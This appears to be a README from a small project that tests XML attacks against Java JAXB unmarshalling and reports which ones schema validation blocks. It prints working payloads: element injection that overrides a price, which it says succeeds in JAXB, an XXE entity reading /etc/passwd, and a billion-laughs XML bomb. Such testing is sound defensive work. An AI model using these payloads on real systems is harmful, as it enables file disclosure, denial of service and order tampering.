XML Attacks for JAXB Processing
-------------------------------------------------------------------------------

How to generate JAXB classes?
-------------------------------------------------------------------------------

$ mvn generate-sources
=> src/generated


Tag Injection
-------------------------------------------------------------------------------

Example: Injecting new attributes and elements

	<SessionRoot>
	    <Sessions>
	        <Session id="one" valid="true" hack="true"/>
	        <Session id="two" valid="false" />
	    </Sessions>    
	    <Hack>
	    	<blackhack id="666" />
	    </Hack>
	</SessionRoot>

=> Doesn't work with JAXB - new tags will be ignored!
=> Doesn't work with Schema validation either
	[org.xml.sax.SAXParseException; lineNumber: 5; columnNumber: 53; 
	cvc-complex-type.3.2.2: Attribute 'hack' is not allowed to appear in element 'Session'.]


Example: Overriding existing elements

	<Item>
		<description>Widget</description>
		<price>500.0</price>
		<quantity>1</quantity>
		
		<!-- Additional Rows below for price and quantity -->
		<price>1.0</price>
		<quantity>1000</quantity>
	</Item>

=> Works with JAXB!!

=> Doesn't work with Schema validation 
	javax.xml.bind.UnmarshalException
	[org.xml.sax.SAXParseException; lineNumber: 9; columnNumber: 9; 
	cvc-complex-type.2.4.d: Invalid content was found starting with element 'price'. 
	No child element is expected at this point.]
   

EXternal Entity Attack (XXE)
-------------------------------------------------------------------------------

Example:

	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
	<Person>
		<FirstName>Sanjay</FirstName>
		<LastName>Acharya&xxe;</LastName>
	</Person>

Alternative:
	<!DOCTYPE foo [  
	  <!ELEMENT foo ANY >
	  <!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>
	
=> Doesn't work with JAXB
javax.xml.bind.UnmarshalException
[org.xml.sax.SAXParseException; lineNumber: 11; columnNumber: 31; 
External Entity: Failed to read external document 'passwd', because 'file' access 
is not allowed due to restriction set by the accessExternalDTD property.]

=> Doesn't work with Schema validation either
javax.xml.bind.UnmarshalException
[org.xml.sax.SAXParseException; lineNumber: 8; columnNumber: 46; 
External Entity: Failed to read external document 'passwd', because 'file' access 
is not allowed due to restriction set by the accessExternalDTD property.]


XML Bomb
-------------------------------------------------------------------------------

Example:
	<!DOCTYPE lolz [
	  <!ENTITY lol "lol">
	  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
	  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
	  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
	  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
	  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
	  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
	  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
	  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
	]>
	<lolz>&lol9;</lolz>	   	
	
=> Doesn't work with JAXB
javax.xml.bind.UnmarshalException
[org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 1; JAXP00010001: 
The parser has encountered more than "64000" entity expansions in this document; 
this is the limit imposed by the JDK.]

=> Doesn't work with Schema validation either
javax.xml.bind.UnmarshalException
[org.xml.sax.SAXParseException; lineNumber: 14; columnNumber: 7; cvc-elt.1: 
Cannot find the declaration of element 'lolz'.]


Resources:
-------------------------------------------------------------------------------
http://sleeplessinslc.blogspot.co.at/2010/09/xml-injection.html		
https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)
https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing
